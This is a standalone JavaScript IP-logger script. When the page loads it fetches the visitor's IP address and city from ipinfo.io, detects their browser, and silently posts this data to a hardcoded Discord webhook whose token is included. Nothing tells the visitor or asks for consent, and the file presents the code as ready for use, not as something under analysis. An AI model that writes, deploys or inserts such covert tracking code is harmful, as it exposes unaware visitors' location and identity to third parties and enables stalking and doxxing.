function sendToDiscord(ip, city, browser) {
    const webhookUrl = 'https://discord.com/api/webhooks/1327405214688481330/a0VpKWYQM2BYOO6EhtmW2obqwbF7vQHDo345JZIdCqXCifENCXRskE-_dseoL7fwrkTA';  // Your Discord webhook URL

    const payload = {
        embeds: [
            {
                title: "__🤖 New Logger__", // Embed title
                description: "**Logging user information...**", // Embed description
                color: 7506394, // Embed color (decimal representation of a hex color code)
                fields: [
                    { 
                        name: "__📜 Information__", 
                        value: `**🍦 IP Address: __${ip}__**\n**🚬 City: __${city}__**\n**🚀 Browser: __${browser}__**`, 
                        inline: false 
                    }
                ],
                timestamp: new Date().toISOString(), // Current timestamp in ISO 8601 format
            },
        ],
    };
    
    
    

    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok.');
        }
        console.log('IP, City, and Browser info sent to Discord successfully.');
    })
    .catch(error => {
        console.error('Error sending information to Discord:', error);
    });
}

function checkIp() {
    fetch('https://ipinfo.io/json')
        .then(response => response.json())
        .then(data => {
            const userIp = data.ip;
            const city = data.city;
            const browser = detectBrowser();
            
            // Send IP, city, and browser info to Discord webhook
            sendToDiscord(userIp, city, browser);
        })
        .catch(error => {
            console.error('Error obtaining IP or other data:', error);
        });
}

function detectBrowser() {
    const userAgent = navigator.userAgent;
    let browserName = 'Unknown Browser';

    if (userAgent.includes('Chrome')) {
        browserName = 'Google Chrome';
    } else if (userAgent.includes('Firefox')) {
        browserName = 'Mozilla Firefox';
    } else if (userAgent.includes('Safari') && !userAgent.includes('Chrome')) {
        browserName = 'Apple Safari';
    } else if (userAgent.includes('Edg')) {
        browserName = 'Microsoft Edge';
    } else if (userAgent.includes('OPR') || userAgent.includes('Opera')) {
        browserName = 'Opera';
    } else if (userAgent.includes('Trident')) {
        browserName = 'Internet Explorer';
    }

    return browserName;
}

// Call the function to check the IP and send it to Discord
checkIp();
